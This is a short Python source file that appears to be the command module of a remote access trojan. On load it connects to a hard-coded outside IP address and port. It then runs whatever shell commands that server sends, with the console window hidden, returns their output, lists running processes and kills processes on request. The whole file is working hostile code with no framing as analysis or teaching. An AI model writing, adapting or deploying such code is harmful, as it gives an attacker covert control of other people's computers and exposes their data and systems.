from managed_socket import Socket
from threading import Thread
import time
import subprocess
import psutil

def milliseconds():
  return round(time.time() * 1000)

class Commands(Thread):
  def __init__(self):
    self.socket = Socket("201.83.5.29", 27593, "commands")
    self.socket.on("data", self.onData)
    self.socket.start()

  def _cmd(self, data):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    p = subprocess.Popen(" ".join(data), stdout=subprocess.PIPE, universal_newlines=True, startupinfo=startupinfo)
    (output, err) = p.communicate()
    self.socket.s.sendall(bytes(f"commandResult;{output}", encoding="utf-8"))

  def _listProcesses(self, data):
    processes = []
    for proc in psutil.process_iter():
      processes.append(f'{proc.name()} - {str(proc.pid)}')

    processes = sorted(processes)
    self.socket.s.sendall(bytes("commandResult;" + '\n'.join(processes), encoding="utf-8"))

  def _killProcess(self, data):
    try:
      pid = int(data[0])
      proc = psutil.Process(pid)
      proc.terminate()
    except:
      pass

  def onData(self, data):
    if hasattr(self, f'_{data[0]}'):
      func = getattr(self, f'_{data[0]}')
      try:
        func(data[1:])
      except Exception as err:
        print(err)
        pass
    else:
      self.socket.s.sendall(b'message;[Commands] Invalid command')

Commands()